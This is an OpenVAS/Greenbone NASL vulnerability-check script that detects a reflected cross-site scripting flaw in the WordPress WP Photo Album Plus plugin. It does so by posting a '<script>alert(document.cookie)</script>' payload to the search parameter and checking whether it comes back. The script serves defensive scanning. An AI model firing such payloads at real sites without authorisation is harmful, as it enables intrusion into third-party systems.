# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902698");
  script_version("2025-03-05T05:38:53+0000");
  script_tag(name:"last_modification", value:"2025-03-05 05:38:53 +0000 (Wed, 05 Mar 2025)");
  script_tag(name:"creation_date", value:"2012-12-31 14:00:10 +0530 (Mon, 31 Dec 2012)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("WordPress WP Photo Album Plus Plugin 'Search Photos' XSS Vulnerability");
  script_xref(name:"URL", value:"http://k3170makan.blogspot.in/2012/12/wp-photoplus-xss-csrf-vuln.html");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/119152/wpphotoplussearch-xssxsrf.txt");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_tag(name:"solution_type", value:"VendorFix");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/http/detected");
  script_tag(name:"impact", value:"Successful exploitation will allow attacker to insert arbitrary
HTML and script code, which will be executed in a user's browser session in the
context of an affected site when the malicious data is being viewed.");
  script_tag(name:"affected", value:"WordPress WP Photo Album Plus Plugin version 4.8.11 and prior");
  script_tag(name:"insight", value:"Input passed via the 'wppa-searchstring' parameter to index.php
(when page_id is set to the Search Photos page) is not properly
sanitised before it is returned to the user.");
  script_tag(name:"solution", value:"Upgrade to WordPress WP Photo Album Plus Plugin version 4.8.12
or later.");
  script_tag(name:"summary", value:"WordPress WP Photo Album Plus Plugin is prone to a cross-site scripting (XSS) vulnerability.");

  script_xref(name:"URL", value:"http://wordpress.org/plugins/wp-photo-album-plus/");
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

## page_id for WP Photo Album Plus Plugin is 8
url = dir + "/?page_id=8";

data = "wppa-searchstring=<script>alert(document.cookie)</script>";
useragent = http_get_user_agent();

# nb: http_host_name() should be always after the static string(s) above but always after any
# dynamically ones (e.g. a random string) which should be different for each hostname.
host = http_host_name(port:port);

req = string("POST ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", useragent, "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", strlen(data), "\r\n",
             "\r\n", data);
res = http_keepalive_send_recv(port:port, data: req);

if(res && res =~ "^HTTP/1\.[01] 200" &&
   "<script>alert(document.cookie)</script>" >< res &&
   "wppaPreviousPhoto" >< res) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
